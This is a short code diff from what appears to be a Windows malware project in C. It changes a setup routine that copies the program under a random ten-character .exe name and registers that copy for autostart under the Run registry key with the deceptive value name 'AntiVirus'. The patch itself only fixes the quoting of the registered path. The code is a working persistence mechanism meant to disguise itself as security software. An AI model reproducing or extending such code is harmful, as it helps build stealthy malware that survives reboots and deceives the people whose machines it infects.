@@ -19,8 +19,10 @@ int reg_Setup(void)
 		char* randName = random_Ascii(10);
 		int pathLen = strlen(appPath) + strlen(randName) + 5 + sizeof(char);
 		char* newPath = malloc(pathLen);
+		char* regNewPath = malloc(pathLen + 2); 
 
 		snprintf(newPath, pathLen, "%s\\%s.exe", appPath, randName);
+		snprintf(regNewPath, pathLen + 2, "\"%s\\%s.exe\"", appPath, randName);
 		free(randName);
 
 		HKEY hkey;
@@ -29,12 +31,15 @@ int reg_Setup(void)
 		if(RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hkey, &dwDispos) != ERROR_SUCCESS)
 		{
 			free(newPath);
+			free(regNewPath);
 
 			return 1;
 		}
 
-		RegSetValueEx(hkey, "AntiVirus", 0, REG_SZ, (LPBYTE)newPath, strlen(newPath) + 1);
+		RegSetValueEx(hkey, "AntiVirus", 0, REG_SZ, (LPBYTE)regNewPath, strlen(regNewPath) + 1);
 		RegCloseKey(hkey);
+
+		free(regNewPath);
 
 		FILE *fo = fopen(prog_globalPath, "rb");
 
